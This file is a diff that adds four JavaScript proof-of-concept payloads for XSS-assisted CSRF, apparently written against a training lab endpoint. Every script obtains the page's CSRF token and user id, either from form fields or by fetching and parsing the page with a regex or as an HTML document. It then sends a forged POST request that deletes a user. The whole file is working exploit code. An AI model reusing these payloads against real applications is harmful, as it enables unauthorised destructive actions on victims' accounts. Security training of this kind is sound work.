@@ -1,0 +1,126 @@
+<!-- DON't FORGET TO URL ENCODE THE PAYLOAD BEFORE SENDING IT -->
+
+<!-- ----------------------------------------------------- POC 1 -------------------------------------------------- -->
+
+<script type="text/javascript">
+
+//variable of the Form
+var uid = document.forms[0].elements[0].value;
+var token = document.forms[0].elements[1].value;
+
+var xhr = new XMLHttpRequest();
+
+// Send The POST Request To Delete the User
+xhr.open("POST", "/lab/webapp/csrf/xss/delete", true);
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+xhr.send("uid="+uid+ "&csrf_token="+token);
+
+</script>
+
+
+<!-- ----------------------------------------------------- POC 1 -------------------------------------------------- -->
+<!-- ----------------------------------------------------- POC 2 (GETTING RESPONSE FOR DEBUGGING) ------------------------------------- -->
+
+<script type="text/javascript">
+
+//variable of the Form
+var uid = document.forms[0].elements[0].value;
+var token = document.forms[0].elements[1].value;
+
+var xhr = new XMLHttpRequest();
+
+// Show the Response (Dont use this in Real life Scenario this is only For Debugging)
+xhr.onreadystatechange = function() 
+{
+    if (this.readyState == 4 && this.status == 200) {
+       // Typical action to be performed when the document is ready
+       response_data = xhr.responseText;
+       
+       document.getElementById("result").innerHTML = response_data;
+       alert(xhr.responseText);
+
+    }  
+};  //end of function
+
+// Send The POST Request To Delete the User
+xhr.open("POST", "/lab/webapp/csrf/xss/delete", true);
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+xhr.send("uid="+uid+ "&csrf_token="+token);
+
+</script>
+<!-- ----------------------------------------------------- POC 2 (GETTING RESPONSE FOR DEBUGGING) ------------------------------------- -->
+
+
+<!-- ------------------------------- POC 3 (GETTING THE TOKEN VIA PARSING HTML RESPONSE THEN PERFORM CSRF) ----------------------------- -->
+
+<script type="text/javascript">
+
+var xhr = new XMLHttpRequest();
+
+// Second Step Wait Until Response is Ready 
+xhr.onreadystatechange = function() 
+{
+    if (this.readyState == 4 && this.status == 200) {
+       
+       response_data = xhr.responseXML;
+
+       // Getting the Token and assign it to a Variable (uid is optional Required in this POC only)
+       var token = response_data.forms[0].elements[1].value;
+       var uid = response_data.forms[0].elements[0].value;
+
+       // Send The POST Request To Delete the User
+       xhr.open("POST", "/lab/webapp/csrf/xss/delete", true);
+	   xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+       xhr.send("uid="+uid+ "&csrf_token="+token);
+       
+       //document.getElementById("result").innerHTML = uid+token;
+       //alert(token);
+
+    }  
+};  //end of function
+  
+// First Step a GET Request is Sent  
+xhr.open("GET", "/lab/webapp/csrf/xss", true);
+xhr.responseType = "document";
+xhr.send();
+</script>
+
+<!-- ------------------------------- POC 3 (GETTING THE TOKEN VIA PARSING HTML RESPONSE THEN PERFORM CSRF) ----------------------------- -->
+
+<!-- ------------------------------- POC 4 (GETTING THE TOKEN VIA PARSING TEXT RESPONSE THEN PERFORM CSRF) ----------------------------- -->
+
+<script type="text/javascript">
+
+var xhr = new XMLHttpRequest();
+
+// Second Step Wait Until Response is Ready 
+xhr.onreadystatechange = function() 
+{
+    if (this.readyState == 4 && this.status == 200) {
+       
+       response_data = xhr.responseText;
+
+       // Getting the Token via match() and assign it to a Variable (uid is optional Required in this POC only)
+       var token = response_data.match(/name="csrf_token" value="(.+)"/)[1];
+       var uid = response_data.match(/name="uid" value="(.+)"/)[1];
+
+        // Send The POST Request To Delete the User
+       xhr.open("POST", "/lab/webapp/csrf/xss/delete", true);
+	   xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+       xhr.send("uid="+uid+ "&csrf_token="+token);
+
+        //alert(uid);
+        //document.getElementById("result").innerHTML = uid+token;
+
+           
+    }  
+};  //end of function
+  
+// First Step a GET Request is Sent  
+xhr.open("GET", "/lab/webapp/csrf/xss", true);
+xhr.send();
+</script>
+
+<!-- ------------------------------- POC 4 (GETTING THE TOKEN VIA PARSING TEXT RESPONSE THEN PERFORM CSRF) ----------------------------- -->
+  
+
